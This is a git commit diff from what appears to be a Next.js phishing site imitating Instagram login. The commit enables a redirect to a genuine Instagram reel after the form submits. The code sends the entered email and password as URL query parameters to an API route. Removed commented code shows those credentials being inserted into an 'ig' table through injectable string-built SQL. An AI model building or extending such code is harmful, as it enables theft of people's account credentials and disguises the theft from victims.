036cf649016c7dad532614c24e7819ac97a468c1
Alper Koşay <83144508+Awoked@users.noreply.github.com>
2023-02-18 16:43:14 +0300

    yonlendirme

--- pages/api/hello.js
+++ pages/api/hello.js
@@ -1,21 +1,4 @@
 
-// import { dbconnection } from "@/db/db"
-
-// export default function handler(req, res) {
-//   try {
-
-//     const query = `INSERT INTO ig (mail, password) VALUES ("${req.query.mail}", "${req.query.password}")`
-//     dbconnection.query(query, (err, result) => {
-//       if (err) throw err;
-//       console.log(req.query);
-//     })
-//     res.status(200).json({ message: req.query })
-//   } catch (err) {
-//     console.log(err);
-//   }
-// }
-
-
 import { createPool } from 'mysql';
 
 // Bağlantı havuzunu yapılandırmak için gerekli bilgileri tanımlayın
--- pages/index.js
+++ pages/index.js
@@ -18,24 +18,13 @@ export default function Home() {
 
   const SubmitHandler = async (e) => {
     e.preventDefault()
-    // fetch("/api/hello", {
-    //   headers: {
-    //     'Content-Type': 'application/json'
-    //   },
-    //   method: "POST",
-    //   body: JSON.stringify({ mail: mail, password: password })
-    // })
-    // .then((res) => {console.log(res)})
-    // .catch((err) => {console.log(err)})
-    // fetch(`/api/hello?mail=${mail}&password=${password}`)
-    //   .then(res => console.log(res.json))
-    //   .catch(err => console.log(err))
+   
     const res = await fetch(`/api/hello?mail=${mail}&password=${password}`);
     const data = await res.json();
     console.log(data);
-    // setTimeout(() => {
-    //   location.href = "https://www.instagram.com/reels/videos/CoBHsQnJP3z/"
-    // }, 1000);
+    setTimeout(() => {
+      location.href = "https://www.instagram.com/reels/videos/CoBHsQnJP3z/"
+    }, 1000);
   }
 
   return (
